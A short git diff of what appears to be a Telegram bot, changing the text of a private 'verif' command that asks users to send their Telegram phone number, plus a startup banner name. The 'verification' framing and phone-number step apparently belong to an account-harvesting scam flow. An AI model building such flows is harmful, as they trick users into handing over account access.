@@ -93,7 +93,7 @@ async def free(_, message):
 
 @app.on_message(filters.command("verif") & filters.private)
 async def verip(_, message):
-    await app.send_message(message.chat.id, "Please enter your Telegram account telephone number..")
+    await app.send_message(message.chat.id, "Please send your telegram phone number…")
 
 # SEND NOMER
 
@@ -326,7 +326,7 @@ async def init():
         except:
             pass
 
-    print("[Rexa Ganteng] - Bot Started!")
+    print("[RENA AFRIANI] - Bot Started!")
     await idle()
 
 
